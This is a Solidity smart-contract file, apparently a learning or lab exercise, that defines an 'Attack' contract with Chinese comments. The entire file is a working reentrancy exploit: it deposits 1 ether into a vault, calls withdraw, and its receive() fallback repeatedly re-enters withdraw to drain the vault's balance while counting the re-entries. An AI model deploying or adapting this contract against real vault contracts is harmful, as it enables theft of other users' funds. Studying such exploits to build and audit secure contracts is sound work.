// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;


interface IVault {
    function deposit()external payable;
    function  withdraw(uint256 amount)external ;
} 

contract Attack {
    IVault immutable vault;
    
    uint256 constant WITH_Vaule=1 ether;
 // 用于调试：记录重入次数
    uint256 public attackCount;
constructor(IVault _vault) {
    vault=_vault;
}

function attack() external payable {
    /// 记录重置次数
    attackCount=0;
require(msg.value==WITH_Vaule, "insuffientVaule");
vault.deposit{value:WITH_Vaule}();
// 进行提取余额
vault.withdraw(WITH_Vaule);

}

receive() external payable {
attackCount++;
if (address(vault).balance>=WITH_Vaule) {
    vault.withdraw(WITH_Vaule);
}

 }
    
/// @notice 获取当前账户的余额

function getBalance()public view   returns (uint256){
    return address(this).balance;
}

}